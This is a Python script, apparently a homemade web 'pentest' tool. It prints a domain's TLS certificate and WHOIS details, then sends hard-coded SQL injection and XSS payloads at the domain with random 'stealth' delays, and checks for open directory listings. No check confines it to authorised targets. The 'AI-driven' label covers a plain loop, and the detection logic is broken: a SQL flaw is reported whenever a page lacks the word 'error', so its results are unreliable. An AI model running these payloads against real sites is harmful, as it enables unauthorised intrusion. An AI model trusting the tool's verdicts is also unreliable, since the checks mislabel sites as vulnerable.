import ssl
import socket
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import pyfiglet
import whois
import time
import random
import itertools

def print_title():
    title = pyfiglet.figlet_format("Pentest Probe")
    print(title)

def get_ssl_certificate(hostname):
    context = ssl.create_default_context()
    conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
    conn.settimeout(5.0)
    conn.connect((hostname, 443))
    cert = conn.getpeercert()
    conn.close()
    return cert

def get_ssl_version(hostname):
    context = ssl.create_default_context()
    conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=hostname)
    conn.settimeout(5.0)
    conn.connect((hostname, 443))
    ssl_version = conn.version()
    conn.close()
    return ssl_version

def categorize_ssl_version(version):
    if version == 'TLSv1.3':
        return 'Excellent'
    elif version == 'TLSv1.2':
        return 'Good'
    elif version in ['TLSv1.1', 'TLSv1']:
        return 'Poor'
    else:
        return 'Unknown'

def get_domain_info(domain):
    try:
        domain_info = whois.whois(domain)
        return domain_info
    except Exception as e:
        return str(e)

# List of powerful SQL injection payloads
sql_injection_payloads = [
    "' OR '1'='1' --",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "' OR 'x'='x",
    "' OR 'a'='a"
]

# List of powerful XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input type=text value=<script>alert('XSS')></script>>"
]

# AI-driven attack sequence prioritization and automation
def ai_automated_attack(urls, payloads, check_function):
    vulnerable_urls = []
    for url, payload in itertools.product(urls, payloads):
        time.sleep(random.uniform(0.5, 2.0))  # Stealth delay
        if check_function(url, payload):
            vulnerable_urls.append(url)
    return vulnerable_urls

def stealth_check_sql_injection(url, payload):
    try:
        response = requests.get(f"{url}{payload}")
        if "error" not in response.text.lower():  # Simplistic check
            return True
    except requests.RequestException as e:
        print(f"Failed to test {url}: {e}")
    return False

def stealth_check_xss(url, payload):
    try:
        response = requests.get(f"{url}{payload}")
        if payload in response.text:  # Simplistic check
            return True
    except requests.RequestException as e:
        print(f"Failed to test {url}: {e}")
    return False

def check_broken_access_control(urls):
    vulnerable_urls = []
    for url in urls:
        try:
            response = requests.get(url)
            if response.status_code == 200 and "Index of /" in response.text:
                vulnerable_urls.append(url)
        except requests.RequestException as e:
            print(f"Failed to test {url}: {e}")
    return vulnerable_urls

def main(domain):
    print(f"Starting SSL scan for {domain}\n")
    
    cert = get_ssl_certificate(domain)
    ssl_version = get_ssl_version(domain)
    version_category = categorize_ssl_version(ssl_version)
    domain_info = get_domain_info(domain)

    # Print certificate details
    print(f"SSL/TLS Certificate Details for {domain}:\n")
    print(f"1. Subject (The entity the certificate is issued to):")
    for item in cert.get('subject', []):
        print(f"   - {item[0][0]}: {item[0][1]}")

    print(f"\n2. Issuer (The entity that issued the certificate):")
    for item in cert.get('issuer', []):
        print(f"   - {item[0][0]}: {item[0][1]}")

    print(f"\n3. Version: {cert.get('version', 'N/A')}")

    print(f"\n4. Serial Number: {cert.get('serialNumber', 'N/A')}")

    print(f"\n5. Validity Period:")
    print(f"   - Not Before: {cert.get('notBefore', 'N/A')}")
    print(f"   - Not After: {cert.get('notAfter', 'N/A')}")

    print(f"\n6. Subject Alternative Name (Other entities the certificate is valid for):")
    for item in cert.get('subjectAltName', []):
        print(f"   - {item[0]}: {item[1]}")

    print(f"\n7. OCSP (Online Certificate Status Protocol): {cert.get('OCSP', 'N/A')}")
    
    print(f"\n8. CA Issuers (Certificate Authority Issuers): {cert.get('caIssuers', 'N/A')}")

    print(f"\n9. CRL Distribution Points (Certificate Revocation List): {cert.get('crlDistributionPoints', 'N/A')}")

    print(f"\n10. SSL/TLS Version: {ssl_version} ({version_category})\n")

    # Print domain information
    print(f"Domain Information for {domain}:\n")
    print(f" - Registrar: {domain_info.get('registrar', 'N/A')}")
    print(f" - Creation Date: {domain_info.get('creation_date', 'N/A')}")
    print(f" - Expiration Date: {domain_info.get('expiration_date', 'N/A')}")
    print(f" - Updated Date: {domain_info.get('updated_date', 'N/A')}")
    print(f" - Name Servers: {', '.join(domain_info.get('name_servers', []))}")

    # Ask user if they want to perform additional checks
    perform_sql_check = input("\nDo you want to perform SQL Injection checks? (yes/no): ").strip().lower()
    perform_xss_check = input("Do you want to perform XSS checks? (yes/no): ").strip().lower()
    perform_access_control_check = input("Do you want to perform Broken Access Control checks? (yes/no): ").strip().lower()

    urls_to_check = [f"http://{domain}", f"https://{domain}"]
    
    if perform_sql_check == 'yes':
        sql_vulnerable_urls = ai_automated_attack(urls_to_check, sql_injection_payloads, stealth_check_sql_injection)
        print("\nSQL Injection Vulnerable URLs:")
        for url in sql_vulnerable_urls:
            print(f" - {url}")
    else:
        print("\nSQL Injection check skipped.")

    if perform_xss_check == 'yes':
        xss_vulnerable_urls = ai_automated_attack(urls_to_check, xss_payloads, stealth_check_xss)
        print("\nXSS Vulnerable URLs:")
        for url in xss_vulnerable_urls:
            print(f" - {url}")
    else:
        print("\nXSS check skipped.")

    if perform_access_control_check == 'yes':
        access_control_vulnerable_urls = check_broken_access_control(urls_to_check)
        print("\nBroken Access Control Vulnerable URLs:")
        for url in access_control_vulnerable_urls:
            print(f" - {url}")
    else:
        print("\nBroken Access Control check skipped.")

if __name__ == "__main__":
    print_title()
    domain = input("Enter the domain to scan: ")
    main(domain)
